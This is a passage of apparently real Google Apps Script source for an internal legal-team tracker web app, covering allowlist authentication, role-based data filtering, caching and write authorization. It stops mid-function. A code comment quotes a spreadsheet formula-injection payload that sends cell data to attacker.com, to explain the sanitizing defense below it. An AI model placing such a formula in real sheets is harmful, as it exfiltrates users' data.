// ════════════════════════════════════════════════════════════════
// Legal Team Tracker · Google Apps Script · Web App
// RappiPlus · Global Legal · v3.4 (Editorial Final)
// ════════════════════════════════════════════════════════════════

const SHEET_ID        = '19eR-pXzVLTSEdCADeBZ8fsd5x4f2t0GowUJiJm2X6ms';
const SHEET_ACTIVO    = 'Tracking Activo';
const SHEET_HISTORIAL = 'Historial';
const SHEET_CONFIG    = 'Config';
const SHEET_EQUIPOS   = 'Equipos';
const SHEET_PROYECTOS = 'Proyectos';

// Tasks: 18 cols — ID,Nombre,Resp,Acc,Deadline,Prioridad,Estado,Semana,Creado,Cerrado,Notas,Proyecto(ID),País,Líder,TipoTrabajo,Riesgo,Documentos,Confidencialidad
// La columna 18 (Confidencialidad) puede no existir todavía en la hoja: getLastColumn() devolverá
// menos y el read defaultea a 'estandar'. Cuando el usuario agregue la columna manualmente,
// los nuevos updates se persisten ahí.
const TASK_COLS = 18;
const TASK_DOCS_COL = 17; // 1-indexed
const TASK_CONF_COL = 18; // 1-indexed
// Projects: 16 cols — ID,Nombre,País,Líder,Responsable,Deadline,Prioridad,Estado,Descripción,Notas,Creado,Semana,Participantes,TipoTrabajo,Riesgo,Documentos
const PROJ_COLS = 16;
const PROJ_DOCS_COL = 16; // 1-indexed

const STATUS_ORDER = {'Bloqueado':0,'En curso':1,'Pendiente':2,'En revisión':3,'Listo':4};
const PRIO_ORDER   = {'Alta':0,'Media':1,'Baja':2};
const PROJ_STATUSES = ['Activo','En pausa','Completado','Cancelado'];

// ── CACHE ───────────────────────────────────────────────────────
// Cacheamos el snapshot completo por 30s. Cualquier escritura llama a invalidateCache().
const CACHE_KEY = 'tracker_data_v1';
const CACHE_TTL_SEC = 30;
function invalidateCache() { try { CacheService.getScriptCache().remove(CACHE_KEY); } catch(e) {} }

// ── WEB APP ─────────────────────────────────────────────────────
// doGet valida que el visitante esté en la allowlist de la hoja Equipos antes de
// renderizar el dashboard. La allowlist combina leaderEmail + emails de cada equipo.
// Requisitos de deployment:
//   - Execute as: Me (owner)
//   - Who has access: Anyone within <dominio> (o Anyone with Google account)
// Así Session.getActiveUser().getEmail() retorna el email verificado del visitante.
function doGet(e) {
  var page = e && e.parameter && e.parameter.page;

  // Endpoint /api?page=api sigue abierto para scripts internos (cambia si necesitas
  // protegerlo también; típicamente se restringe con execute-as y acceso limitado).
  if (page === 'api') {
    return ContentService.createTextOutput(JSON.stringify(getTrackerData()))
      .setMimeType(ContentService.MimeType.JSON);
  }

  // Endpoint público /exec?page=demo: sirve el HTML standalone del demo editorial.
  // Sin auth (es para presentación interna). Si en el futuro queremos cerrarlo,
  // basta con resolver el visitante antes de retornar.
  if (page === 'demo') {
    return HtmlService.createHtmlOutputFromFile('frontend/StandaloneDemo')
      .setTitle('Legal Tracker — Editorial Deep')
      .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);
  }

  // 1) Autenticación: resolver el usuario visitante contra la allowlist
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var equipos = readEquipos(ss);
  var config = readConfig(ss);
  var authResult = resolveVisitor(equipos);

  if (!authResult.ok) {
    return renderAccessDenied(authResult);
  }

  // 2) Determinar rol (head / manager / specialist) contra hoja Config
  var role = determineRole(authResult.email, authResult.user, config);

  // 3) Render normal, con el usuario ya resuelto y rol determinado
  var html = HtmlService.createTemplateFromFile('frontend/Dashboard');
  html.data = JSON.stringify(getEditorialData());
  html.currentUser = JSON.stringify({
    email: authResult.email,
    name:  authResult.user.name,
    code:  authResult.user.code,
    isLeader: !!authResult.user.isLeader,
    role: role
  });
  // SECURITY: por default Apps Script setea X-Frame-Options=SAMEORIGIN, lo que
  // mitiga clickjacking. Antes estaba ALLOWALL (cualquiera podía iframearlo).
  // TODO: si el equipo necesita embeberlo en Notion/Confluence, agregar selectivamente
  // ALLOWALL aquí (asumiendo el riesgo de clickjacking documentado en code review).
  return html.evaluate()
    .setTitle('Legal Tracker · Rappi')
    .addMetaTag('viewport','width=device-width, initial-scale=1');
}

function include(f){ return HtmlService.createHtmlOutputFromFile(f).getContent(); }

// ── AUTH HELPERS ────────────────────────────────────────────────
// Arma un mapa (email lowercase) → {name, code, isLeader} a partir de la hoja Equipos.
// - leaderEmail se mapea a leader
// - emails[i] se asume paralelo a members[i] (mismo orden)
// - First-wins: si un email aparece en varios equipos (ej. Eduardo es leader
//   de CO y CR), se queda con el primero del Sheet. Sin esto, la última
//   iteración pisa el código de país y el manager queda en el equipo
//   equivocado. Multi-country real queda para Fase 2.
function buildEmailAllowlist(equipos) {
  var map = {};
  equipos.forEach(function(eq) {
    if (eq.leaderEmail) {
      var le = eq.leaderEmail.toString().toLowerCase().trim();
      if (le && !map[le]) {
        map[le] = { name: eq.leader, code: eq.code, isLeader: true };
      }
    }
    for (var i = 0; i < (eq.members || []).length; i++) {
      var email = (eq.emails || [])[i];
      if (email) {
        var em = email.toString().toLowerCase().trim();
        if (em && !map[em]) {
          map[em] = { name: eq.members[i], code: eq.code, isLeader: false };
        }
      }
    }
  });
  return map;
}

// Retorna {ok:true, email, user} si el visitante tiene acceso; caso contrario
// {ok:false, reason, email} para mostrar el motivo en la página de denegado.
function resolveVisitor(equipos) {
  var email = '';
  try { email = (Session.getActiveUser().getEmail() || '').toLowerCase().trim(); } catch(e) {}
  if (!email) {
    return { ok: false, reason: 'no_session',
      message: 'No pudimos identificar tu cuenta. Asegúrate de estar logueado en Google con tu correo corporativo.' };
  }
  var allow = buildEmailAllowlist(equipos);
  var user = allow[email];
  if (!user) {
    return { ok: false, reason: 'not_allowlisted', email: email,
      message: 'Tu correo (' + email + ') no está registrado en el tracker. Pide a tu líder de equipo que lo agregue en la hoja "Equipos".' };
  }
  return { ok: true, email: email, user: user };
}

// Renderiza una página simple de "acceso denegado" con el mismo look del tracker.
function renderAccessDenied(authResult) {
  var safeMsg = (authResult.message || 'Acceso denegado').replace(/</g, '&lt;');
  var body = ''
    + '<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">'
    + '<meta name="viewport" content="width=device-width,initial-scale=1">'
    + '<title>Legal Tracker · Sin acceso</title>'
    + '<style>'
    +   'body{background:#0C0E14;color:#F0F2F8;font-family:system-ui,sans-serif;'
    +        'margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}'
    +   '.box{max-width:420px;background:#151820;border:1px solid rgba(255,255,255,.08);'
    +        'border-radius:16px;padding:40px;text-align:center}'
    +   '.logo{width:56px;height:56px;border-radius:16px;background:#FF4940;display:flex;'
    +         'align-items:center;justify-content:center;font-size:26px;margin:0 auto 20px}'
    +   'h1{font-size:20px;font-weight:800;margin:0 0 12px}'
    +   'p{color:#9099B0;font-size:13px;line-height:1.55;margin:0}'
    +   '.email{font-family:ui-monospace,monospace;color:#FFB938;word-break:break-all}'
    + '</style></head><body>'
    + '<div class="box">'
    +   '<div class="logo">🔒</div>'
    +   '<h1>Sin acceso al Legal Tracker</h1>'
    +   '<p>' + safeMsg + '</p>'
    + '</div></body></html>';
  return HtmlService.createHtmlOutput(body)
    .setTitle('Legal Tracker · Sin acceso')
    .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);
}

// ════════════════════════════════════════════════════════════════
// GET ALL DATA
// ════════════════════════════════════════════════════════════════
// Entry point que resuelve al visitante, determina su rol y devuelve la data
// filtrada según lo que debe ver. Delega reads caros a _buildRawData()
// (cacheado) y calcula stats en memoria sobre el subset visible.
function getTrackerData() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var equipos = readEquipos(ss);
  var config = readConfig(ss);
  var auth = resolveVisitor(equipos);
  if (!auth.ok) throw new Error('No autorizado: ' + auth.message);
  var role = determineRole(auth.email, auth.user, config);
  var raw = _cachedRawData();
  return _buildViewForRole(raw, role, auth.user);
}

// ════════════════════════════════════════════════════════════════
// EDITORIAL DATA (extiende getTrackerData con campos derivados)
// ════════════════════════════════════════════════════════════════
// Wrapper sobre getTrackerData() que enriquece tareas, miembros del equipo
// y países con campos derivados que la nueva UI editorial consume.
// Reusa la cache de 30s vía getTrackerData(); los cálculos extra son baratos.
// NO modifica el shape original — sólo agrega campos.
function getEditorialData() {
  return _telemetry('getEditorialData', _getEditorialDataImpl);
}
function _getEditorialDataImpl() {
  var data = getTrackerData();
  var today = Utilities.formatDate(new Date(), 'America/Bogota', 'yyyy-MM-dd');

  // Enriquecer tareas activas + historial
  if (data.tasks && data.tasks.length) {
    data.tasks.forEach(function(t) { _enrichTaskEditorial(t, today); });
  }
  if (data.historial && data.historial.length) {
    data.historial.forEach(function(t) { _enrichTaskEditorial(t, today); });
  }

  // Enriquecer miembros del team (load, capacity, overdue, blocked, streak, avgs)
  if (data.team && data.team.length) {
    data.team.forEach(function(member) {
      var memberTasks = (data.tasks || []).filter(function(t){ return t.resp === member.name; });
      var activeTasks = memberTasks.filter(function(t){ return t.status !== 'Listo' && t.status !== 'Cancelado'; });
      member.load     = activeTasks.length;
      member.capacity = 5; // TODO Fase 2: leer de hoja Config
      member.overdue  = memberTasks.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays < 0; }).length;
      member.blocked  = memberTasks.filter(function(t){ return t.status === 'Bloqueado'; }).length;

      // Historial del miembro con bizDays + fecha de cierre parseada.
      // creadoRaw viene como ISO; cerrado viene como 'dd/MM/yyyy' (no hay cerradoRaw).
      var SLA_BY_PRIO = { 'Alta': 2, 'Media': 5, 'Baja': 7 };
      var memberHist = (data.historial || [])
        .filter(function(t){ return t.resp === member.name && t.creadoRaw && t.cerrado; })
        .map(function(t) {
          var p = t.cerrado.split('/');
          var cerradoDate = new Date(parseInt(p[2], 10), parseInt(p[1], 10) - 1, parseInt(p[0], 10));
          return {
            priority: t.priority,
            bizDays: countBizDays(new Date(t.creadoRaw), cerradoDate),
            cerradoDate: cerradoDate
          };
        });

      // streak: tareas cerradas a tiempo consecutivamente, de más reciente
      // a más antigua. "A tiempo" = bizDays <= SLA de su prioridad.
      var streak = 0;
      var sortedDesc = memberHist.slice().sort(function(a, b){ return b.cerradoDate - a.cerradoDate; });
      for (var i = 0; i < sortedDesc.length; i++) {
        var sla = SLA_BY_PRIO[sortedDesc[i].priority] || 5;
        if (sortedDesc[i].bizDays <= sla) streak++;
        else break;
      }
      member.streak = streak;

      // avgAlta / avgMedia / avgBaja: promedio de bizDays de cierre por prioridad.
      // "—" si no hay tareas cerradas de esa prioridad. Entero → "3d", decimal → "1.5d".
      function avgFor(prio) {
        var arr = memberHist.filter(function(h){ return h.priority === prio; });
        if (!arr.length) return '—';
        var sum = arr.reduce(function(s, h){ return s + h.bizDays; }, 0);
        var avg = sum / arr.length;
        return (avg === Math.floor(avg) ? avg.toString() : avg.toFixed(1)) + 'd';
      }
      member.avgAlta  = avgFor('Alta');
      member.avgMedia = avgFor('Media');
      member.avgBaja  = avgFor('Baja');
    });
  }

  // Enriquecer countries (open, overdue, slaPct, trend)
  if (data.countries && data.countries.length) {
    var SLA_BY_PRIO_C = { 'Alta': 2, 'Media': 5, 'Baja': 7 };
    var nowMs = new Date().getTime();
    var THIRTY_DAYS_MS = 30 * 24 * 60 * 60 * 1000;
    var WEEK_MS = 7 * 24 * 60 * 60 * 1000;

    data.countries.forEach(function(c) {
      var countryTasks = (data.tasks || []).filter(function(t){ return t.pais === c.code; });
      c.open    = countryTasks.filter(function(t){ return t.status !== 'Listo'; }).length;
      c.overdue = countryTasks.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays < 0; }).length;

      // Historial del país con cerrado parseado (dd/MM/yyyy → Date) y bizDays.
      var countryHist = (data.historial || [])
        .filter(function(t){ return t.pais === c.code && t.creadoRaw && t.cerrado; })
        .map(function(t) {
          var p = t.cerrado.split('/');
          var cerradoDate = new Date(parseInt(p[2], 10), parseInt(p[1], 10) - 1, parseInt(p[0], 10));
          return {
            priority: t.priority,
            cerradoMs: cerradoDate.getTime(),
            bizDays: countBizDays(new Date(t.creadoRaw), cerradoDate)
          };
        });

      // slaPct: % de cierres dentro de SLA en los últimos 30 días.
      // Sin historial reciente → 100 (no penalizar países sin cierres).
      var recent = countryHist.filter(function(h){ return (nowMs - h.cerradoMs) <= THIRTY_DAYS_MS; });
      if (recent.length === 0) {
        c.slaPct = 100;
      } else {
        var onTime = 0;
        recent.forEach(function(h) {
          var sla = SLA_BY_PRIO_C[h.priority] || 5;
          if (h.bizDays <= sla) onTime++;
        });
        c.slaPct = Math.round((onTime / recent.length) * 100);
      }

      // trend: 12 buckets semanales, índice 11 = semana actual.
      // Proxy autorizado: cerradas por semana (throughput) en lugar de
      // tareas activas en stock. Lectura visual = velocidad de cierre.
      var trend = [0,0,0,0,0,0,0,0,0,0,0,0];
      countryHist.forEach(function(h) {
        var weeksAgo = Math.floor((nowMs - h.cerradoMs) / WEEK_MS);
        if (weeksAgo >= 0 && weeksAgo < 12) {
          trend[11 - weeksAgo]++;
        }
      });
      c.trend = trend;
    });
  }

  // Globales
  data.today = today;
  data.roleSpecific = data.roleSpecific || {};
  data.roleSpecific.narrative = _buildNarrative(data);

  return data;
}

// Calcula y agrega los campos derivados a una tarea: eta, etaDays,
// accionable, blockedReason, slaTarget. Mutación in-place.
function _enrichTaskEditorial(t, todayISO) {
  // etaDays + eta humano
  if (t.deadlineISO) {
    var diff = _daysBetweenISO(todayISO, t.deadlineISO);
    t.etaDays = diff;
    t.eta = _fmtEta(diff);
  } else {
    t.etaDays = null;
    t.eta = '';
  }

  // accionable: primera línea de notas, o derivado del estado
  var firstNoteLine = '';
  if (t.notas) {
    var lines = t.notas.toString().split(/\r?\n/);
    firstNoteLine = (lines[0] || '').trim();
  }
  if (firstNoteLine) {
    t.accionable = firstNoteLine;
  } else {
    var byStatus = {
      'Pendiente':   'Por iniciar',
      'En curso':    'Avanzar',
      'En revisión': 'Revisar',
      'Bloqueado':   'Desbloquear',
      'Listo':       'Cerrada'
    };
    t.accionable = byStatus[t.status] || '';
  }

  // blockedReason: solo cuando la tarea está bloqueada
  t.blockedReason = (t.status === 'Bloqueado') ? firstNoteLine : '';

  // slaTarget por prioridad
  var slaByPrio = { 'Alta': '2d', 'Media': '5d', 'Baja': '7d' };
  t.slaTarget = slaByPrio[t.priority] || '5d';
}

// Diferencia de días entre dos fechas ISO (YYYY-MM-DD). Resultado en días enteros.
// Negativo si endISO está en el pasado relativo a startISO.
function _daysBetweenISO(startISO, endISO) {
  var s = _parseISODate(startISO);
  var e = _parseISODate(endISO);
  if (!s || !e) return 0;
  var ms = e.getTime() - s.getTime();
  return Math.round(ms / (1000 * 60 * 60 * 24));
}

// Parsea YYYY-MM-DD como fecha local (medianoche). Evita drift de timezone.
function _parseISODate(iso) {
  if (!iso) return null;
  var m = iso.toString().match(/^(\d{4})-(\d{2})-(\d{2})/);
  if (!m) return null;
  return new Date(parseInt(m[1], 10), parseInt(m[2], 10) - 1, parseInt(m[3], 10));
}

// Convierte etaDays (int) en string humano editorial.
function _fmtEta(days) {
  if (days < 0) return 'venció hace ' + Math.abs(days) + 'd';
  if (days === 0) return 'vence HOY';
  if (days === 1) return 'mañana';
  return 'en ' + days + 'd';
}

// Genera la narrativa contextual server-side, en función del rol del visitante.
function _buildNarrative(data) {
  var role = data._role;
  var tasks = data.tasks || [];
  var active = tasks.filter(function(t){ return t.status !== 'Listo'; });
  var thisWeek = tasks.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays >= 0 && t.etaDays <= 7; });
  var atRisk = tasks.filter(function(t){ return (typeof t.etaDays === 'number' && t.etaDays < 0) || t.status === 'Bloqueado'; });

  if (role === 'specialist') {
    return 'Tienes ' + active.length + ' tareas activas. ' + thisWeek.length + ' vencen esta semana.';
  }
  if (role === 'manager') {
    return 'Tu equipo tiene ' + active.length + ' tareas activas. ' + atRisk.length + ' están en riesgo.';
  }
  // head / hq
  var countries = (data.countries || []).length;
  return 'LATAM tiene ' + active.length + ' tareas activas en ' + countries + ' países.';
}

// Cache solo la parte cara: lecturas del sheet. Los cálculos de stats se
// recalculan por rol (barato) porque filtramos por usuario.
function _cachedRawData() {
  try {
    var cached = CacheService.getScriptCache().get(CACHE_KEY);
    if (cached) return JSON.parse(cached);
  } catch(e) {}
  var raw = _buildRawData();
  try { CacheService.getScriptCache().put(CACHE_KEY, JSON.stringify(raw), CACHE_TTL_SEC); } catch(e) {}
  return raw;
}

// Lee del sheet todo lo que necesitamos para construir una vista, sin
// calcular stats. El caller filtra y calcula después.
function _buildRawData() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var activeTasks = readTasks(ss.getSheetByName(SHEET_ACTIVO));
  var histTasks   = readTasks(ss.getSheetByName(SHEET_HISTORIAL));
  var config  = readConfig(ss);
  var equipos = readEquipos(ss);
  var projects = readProjects(ss);
  return {
    tasks: activeTasks,
    historial: histTasks,
    projects: projects,
    equipos: equipos,
    config: config,
    semana: activeTasks.length > 0 ? activeTasks[0].semana : getCurrentWeekLabel(),
    generated: Utilities.formatDate(new Date(), 'America/Bogota', 'dd/MM/yyyy HH:mm')
  };
}

// ── ROLE-BASED FILTERING ─────────────────────────────────────────
// Determina el rol del visitante:
//   head       → email en config.Heads (csv, case-insensitive)
//   manager    → es líder de algún equipo (user.isLeader del allowlist)
//   specialist → resto
function determineRole(email, user, config) {
  var headsRaw = (config && config.Heads) ? config.Heads.toString() : '';
  var heads = headsRaw.toLowerCase().split(',').map(function(s){ return s.trim(); }).filter(Boolean);
  if (heads.indexOf((email || '').toLowerCase()) >= 0) return 'head';
  if (user && user.isLeader) return 'manager';
  return 'specialist';
}

// Filtra tareas según el rol del usuario.
//   head      → todas
//   manager   → las de su país (pais === user.code, o resp en ese equipo)
//   specialist→ solo donde resp === user.name
// Después aplica un segundo filtro por confidencialidad de la tarea:
//   estandar     → visible para todo el equipo (rol OK actual)
//   restringido  → solo resp / lider / head / manager del país
//   confidencial → solo resp / lider / head
function filterTasksForRole(tasks, role, user, equipos) {
  var roleFiltered;
  if (role === 'head') {
    roleFiltered = tasks;
  } else if (role === 'manager') {
    roleFiltered = tasks.filter(function(t) {
      var cc = t.pais || getCountryForMember(t.resp, equipos);
      return cc === user.code;
    });
  } else {
    roleFiltered = tasks.filter(function(t){ return t.resp === user.name; });
  }

  // Filtro adicional por confidencialidad (server-side enforcement, no solo UI)
  return roleFiltered.filter(function(t) {
    var conf = (t.confidencialidad || 'estandar').toString().trim().toLowerCase() || 'estandar';
    if (conf === 'estandar') return true;
    if (conf === 'restringido') {
      return user.name === t.resp
          || user.name === t.lider
          || role === 'head'
          || (role === 'manager' && t.pais === user.code);
    }
    if (conf === 'confidencial') {
      return user.name === t.resp
          || user.name === t.lider
          || role === 'head';
    }
    return true;
  });
}

// Filtra proyectos según el rol.
//   head      → todos
//   manager   → los de su país (pais === user.code)
//   specialist→ donde responsable === user.name o está en participantes
function filterProjectsForRole(projects, role, user) {
  if (role === 'head') return projects;
  if (role === 'manager') {
    return projects.filter(function(p){ return p.pais === user.code; });
  }
  return projects.filter(function(p) {
    if (p.responsable === user.name) return true;
    if (p.participantes && p.participantes.indexOf(user.name) >= 0) return true;
    return false;
  });
}

// Construye la vista completa (tasks filtradas, projects filtrados, stats
// recalculadas, KPIs, SLA, team grid, countries) para un rol+usuario dado.
function _buildViewForRole(raw, role, user) {
  var equipos = raw.equipos;
  var allTasks = raw.tasks;
  var allHist  = raw.historial;
  var allProjects = raw.projects;

  var tasks = filterTasksForRole(allTasks, role, user, equipos);
  var historial = filterTasksForRole(allHist, role, user, equipos);
  var projects = filterProjectsForRole(allProjects, role, user);

  // Enrich cada proyecto con sus tareas visibles y stats derivadas.
  var projMap = {};
  projects.forEach(function(p) {
    p.tasks = [];
    p.taskStats = { total:0, pendiente:0, enCurso:0, enRevision:0, bloqueado:0, listo:0, alta:0, media:0, baja:0 };
    projMap[p.id] = p;
  });
  tasks.forEach(function(t) {
    var pid = t.proyectoId;
    if (!pid || !projMap[pid]) return;
    projMap[pid].tasks.push(t);
    var s = projMap[pid].taskStats;
    s.total++;
    if (t.status === 'Pendiente')    s.pendiente++;
    if (t.status === 'En curso')     s.enCurso++;
    if (t.status === 'En revisión')  s.enRevision++;
    if (t.status === 'Bloqueado')    s.bloqueado++;
    if (t.status === 'Listo')        s.listo++;
    if (t.priority === 'Alta')       s.alta++;
    if (t.priority === 'Media')      s.media++;
    if (t.priority === 'Baja')       s.baja++;
  });
  historial.forEach(function(t) {
    var pid = t.proyectoId;
    if (!pid || !projMap[pid]) return;
    var s = projMap[pid].taskStats;
    s.total++; s.listo++;
  });
  // Auto-status de proyectos (misma lógica que antes)
  projects.forEach(function(p) {
    var s = p.taskStats;
    p.pctDone = s.total > 0 ? Math.round(s.listo / s.total * 100) : 0;
    if (p.status === 'Cancelado') return;
    if (s.total > 0 && s.listo === s.total) { p.status = 'Completado'; return; }
    if (p.statusForced) return;
    if (s.total === 0) return;
    if (s.bloqueado > 0 && s.enCurso === 0 && s.pendiente === 0 && s.enRevision === 0) p.status = 'En pausa';
    else p.status = 'Activo';
  });

  // KPIs globales sobre el subset visible
  var kpi = { total: tasks.length, alta:0, media:0, baja:0, pendiente:0, enCurso:0, bloqueado:0, enRevision:0, listo:0 };
  tasks.forEach(function(t) {
    if (t.priority === 'Alta')  kpi.alta++;
    if (t.priority === 'Media') kpi.media++;
    if (t.priority === 'Baja')  kpi.baja++;
    if (t.status === 'Pendiente')    kpi.pendiente++;
    if (t.status === 'En curso')     kpi.enCurso++;
    if (t.status === 'Bloqueado')    kpi.bloqueado++;
    if (t.status === 'En revisión')  kpi.enRevision++;
    if (t.status === 'Listo')        kpi.listo++;
  });

  // Per-person stats: construidas solo a partir de responsables visibles en tasks
  var teamMap = {};
  tasks.forEach(function(t) {
    if (!t.resp) return;
    if (!teamMap[t.resp]) teamMap[t.resp] = { total:0, alta:0, media:0, baja:0, pendiente:0, enCurso:0, bloqueado:0, enRevision:0, listo:0 };
    var p = teamMap[t.resp];
    p.total++;
    if (t.priority === 'Alta')  p.alta++;
    if (t.priority === 'Media') p.media++;
    if (t.priority === 'Baja')  p.baja++;
    if (t.status === 'Pendiente')    p.pendiente++;
    if (t.status === 'En curso')     p.enCurso++;
    if (t.status === 'Bloqueado')    p.bloqueado++;
    if (t.status === 'En revisión')  p.enRevision++;
    if (t.status === 'Listo')        p.listo++;
  });
  var team = Object.keys(teamMap).sort().map(function(name) {
    var m = teamMap[name];
    return {
      name: name,
      initials: name.split(' ').slice(0, 2).map(function(w){ return w[0]; }).join('').toUpperCase(),
      country: getCountryForMember(name, equipos),
      total: m.total, alta: m.alta, media: m.media, baja: m.baja,
      pendiente: m.pendiente, enCurso: m.enCurso, bloqueado: m.bloqueado,
      enRevision: m.enRevision, listo: m.listo,
      pctDone: m.total > 0 ? Math.round(m.listo / m.total * 100) : 0
    };
  });

  // Per-country stats: solo países que tienen al menos una tarea visible
  var countryMap = {};
  tasks.forEach(function(t) {
    var cc = t.pais || getCountryForMember(t.resp, equipos);
    if (!cc) return;
    if (!countryMap[cc]) {
      var eq = equipos.find(function(e){ return e.code === cc; });
      countryMap[cc] = { code: cc, name: eq ? eq.country : cc, leader: eq ? eq.leader : '', total:0, alta:0, media:0, baja:0 };
    }
    var c = countryMap[cc];
    c.total++;
    if (t.priority === 'Alta')  c.alta++;
    if (t.priority === 'Media') c.media++;
    if (t.priority === 'Baja')  c.baja++;
  });

  // SLA
  var now = new Date();
  var slaLimits = { Alta: 2, Media: 5, Baja: 7 };
  var sla = { onTime: 0, atRisk: 0, overdue: 0 };
  tasks.forEach(function(t) {
    if (t.status === 'Listo') return;
    if (!t.creadoRaw) { sla.onTime++; return; }
    var bizDays = countBizDays(new Date(t.creadoRaw), now);
    var limit = slaLimits[t.priority] || 5;
    if (bizDays > limit) sla.overdue++;
    else if (bizDays >= limit - 1) sla.atRisk++;
    else sla.onTime++;
  });

  // Lista de proyectos para dropdowns (solo activos + en pausa)
  var projectList = projects
    .filter(function(p){ return p.status !== 'Completado' && p.status !== 'Cancelado'; })
    .map(function(p){ return { id: p.id, nombre: p.nombre }; });

  // Filtrar `equipos` según rol — un specialist o manager no debería ver miembros
  // y emails de otros países (PII / confidencialidad organizacional).
  var visibleEquipos = equipos;
  if (role === 'specialist' || role === 'manager') {
    visibleEquipos = equipos.filter(function(e){ return e.code === user.code; });
  }

  return {
    tasks: tasks,
    historial: historial,
    kpi: kpi,
    sla: sla,
    team: team,
    countries: Object.values(countryMap),
    equipos: visibleEquipos,
    projects: projects,
    projectList: projectList,
    semana: raw.semana,
    generated: raw.generated,
    config: raw.config,
    _role: role,
    _user: { name: user.name, code: user.code, isLeader: !!user.isLeader }
  };
}

// ════════════════════════════════════════════════════════════════
// WRITE AUTHORIZATION
// ════════════════════════════════════════════════════════════════
// Convierte throws en {success:false, error} para que el frontend reciba
// Previene formula injection en Sheets. Si un valor empieza con
// =, +, -, @, tab o CR, Sheets lo evalúa como fórmula. Ej: un usuario
// que escribe '=IMPORTDATA("https://attacker.com/?d="&A1)' como nombre
// de tarea exfiltra datos de la fila al renderearla. Mitigation:
// prefijar con apóstrofo ('), que Sheets trata como texto literal y
// no muestra. Aplicar a TODO valor que viene del cliente antes de
// setValue/appendRow. Es no-op para números, booleans, Date, null.
function _sanitizeCell(v) {
  if (v == null) return v;
  if (typeof v === 'number' || typeof v === 'boolean') return v;
  if (v instanceof Date) return v;
  var s = String(v);
  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}
function _sanitizeRow(arr) {
  return arr.map(_sanitizeCell);
}

// siempre el mismo contrato (failureHandler deja la UI en estado raro).
function _safeMutation(fn) {
  try {
    return fn();
  } catch (e) {
    return { success: false, error: (e && e.message) || String(e) };
  }
}

// ── TELEMETRY ───────────────────────────────────────────────────
// Wrapper mínimo para entry-points públicos. Loggea email del visitante,
// nombre de la función, duración (ms), success/error y meta opcional.
// Dos sinks: console.info (Stackdriver / Apps Script Executions) y la hoja
// 'Telemetry' del spreadsheet (si existe). Re-lanza el error original para
// no alterar el comportamiento del entry-point.
function _telemetry(fnName, fn, meta) {
  var start = Date.now();
  var email = '';
  try { email = Session.getActiveUser().getEmail() || ''; } catch (e) {}
  var result, err;
  try {
    result = fn();
  } catch (e) {
    err = e;
  }
  var duration = Date.now() - start;
  var success = !err && (result == null || result.success !== false);
  var record = {
    ts: new Date().toISOString(),
    email: email,
    fn: fnName,
    duration: duration,
    success: success,
    error: err ? (err.message || String(err)) : (result && result.error) || null,
    meta: meta || null
  };
  // 1) Stackdriver vía console.info (se ve en Apps Script Executions / GCP Logging)
  try { console.info(JSON.stringify(record)); } catch (e) {}
  // 2) Hoja Telemetry (si existe). NO crearla automáticamente; el dueño la crea cuando quiera.
  try { _appendTelemetryRow(record); } catch (e) {}
  if (err) throw err;
  return result;
}

// Cómo activar: el dueño del sheet crea una hoja llamada 'Telemetry' con
// columnas: ts | email | fn | duration_ms | status | error | meta.
// Sin la hoja, el log queda solo en Stackdriver (console.info).
function _appendTelemetryRow(record) {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var ws = ss.getSheetByName('Telemetry');
  if (!ws) return; // hoja no existe → skip silencioso (no error)
  ws.appendRow([
    record.ts, record.email, record.fn, record.duration,
    record.success ? 'OK' : 'ERR',
    record.error || '', record.meta ? JSON.stringify(record.meta) : ''
  ]);
}

// Contexto actual del visitante + su rol. Se usa en cada mutation.
function _getAuthContext() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var equipos = readEquipos(ss);
  var config = readConfig(ss);
  var auth = resolveVisitor(equipos);
  if (!auth.ok) throw new Error('No autorizado: ' + auth.message);
  var role = determineRole(auth.email, auth.user, config);
  return { email: auth.email, user: auth.user, role: role, equipos: equipos, ss: ss };
}

// Valida que el visitante pueda modificar una tarea específica.
// target = {resp, pais} (al menos estos campos). Lanza si no puede.
function _authorizeTaskWrite(ctx, target) {
  if (ctx.role === 'head') return;
  if (ctx.role === 'manager') {
    var cc = (target && target.pais) || (target ? getCountryForMember(target.resp, ctx.equipos) : '');
    if (cc && cc !== ctx.user.code) {
      throw new Error('Sin permiso: tarea de otro país (' + cc + ')');
    }
    return;
  }
  // specialist: solo sus propias tareas
  if (!target || _normalizeName(target.resp) !== _normalizeName(ctx.user.name)) {
    throw new Error('Sin permiso: solo puedes modificar tus tareas');
  }
}

// Valida que el visitante pueda modificar un proyecto específico.
// target = {responsable, pais, participantes}
function _authorizeProjectWrite(ctx, target) {
  if (ctx.role === 'head') return;
  if (ctx.role === 'manager') {
    if (target && target.pais && target.pais !== ctx.user.code) {
      throw new Error('Sin permiso: proyecto de otro país (' + target.pais + ')');
    }
    return;
  }
  // specialist: responsable o participante
  if (!target) throw new Error('Sin permiso');
  if (target.responsable === ctx.user.name) return;
  if (target.participantes && target.participantes.indexOf(ctx.user.name) >= 0) return;
  throw new Error('Sin permiso: solo puedes modificar proyectos donde participas');
}

// Lee el estado actual de una tarea desde el sheet (para validar antes de escribir).
function _readTaskById(ss, taskId) {
  var ws = ss.getSheetByName(SHEET_ACTIVO);
  var lr = ws.getLastRow();
  if (lr < 4) return null;
  var data = ws.getRange(4, 1, lr - 3, Math.min(ws.getLastColumn(), TASK_COLS)).getValues();
  for (var i = 0; i < data.length; i++) {
    if (data[i][0] == taskId) {
      return { row: i + 4, resp: data[i][2], pais: (data[i][12] || '').toString().trim() };
    }
  }
  return null;
}

function _readProjectById(ss, projId) {
  var ws = ss.getSheetByName(SHEET_PROYECTOS);
  if (!ws) return null;
  var lr = ws.getLastRow();
  if (lr < 2) return null;
  var data = ws.getRange(2, 1, lr - 1, Math.min(ws.getLastColumn(), PROJ_COLS)).getValues();
  for (var i = 0; i < data.length; i++) {
    if (data[i][0] == projId) {
      return {
        row: i + 2,
        pais: (data[i][2] || '').toString().trim(),
